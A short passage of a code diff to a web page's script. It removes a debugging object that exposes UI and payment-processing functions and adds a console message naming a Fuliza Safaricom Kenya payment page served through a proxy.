-            showPage('welcome');
-
-            // ── Expose for debugging (optional) ──
-            window.__fuliza = {
-                showToast,
-                showModal,
-                hideModal,
-                resetForm,
-                processPayment,
-            };
-
-        })();
+        console.log('🇰🇪 Fuliza Safaricom Kenya (Paylore via proxy)');
     </script>
 </body>
 </html>
